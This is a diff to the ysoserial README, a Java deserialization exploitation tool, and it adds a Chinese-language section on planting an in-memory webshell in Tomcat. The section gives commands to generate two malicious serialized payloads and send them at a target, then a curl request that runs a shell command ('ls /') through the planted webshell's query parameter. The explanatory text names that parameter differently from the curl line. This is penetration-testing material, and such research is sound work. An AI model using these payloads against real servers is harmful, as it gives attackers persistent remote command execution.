@@ -13,6 +13,22 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 ![logo](ysoserial.png)
 
+## tomcat通杀回显-内存webshell
+例：
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
+CommonsCollections11ForTomcatEchoInject > echo.payload
+```
+然后使用上述得到的恶意序列化数据 echo.payload 攻击一遍，然后再继续下面的操作
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
+CommonsCollections11ForTomcatShellInject > shell.payload
+```
+使用恶意序列化数据 shell.payload 再攻击一遍，就能得到一个内存级的webshell，任意路径，参数threedram为命令
+```
+curl http://127.0.0.1:8080/aaa\?threedr3am\=ls%20/
+```
+
 ## Description
 
 Originally released as part of AppSecCali 2015 Talk
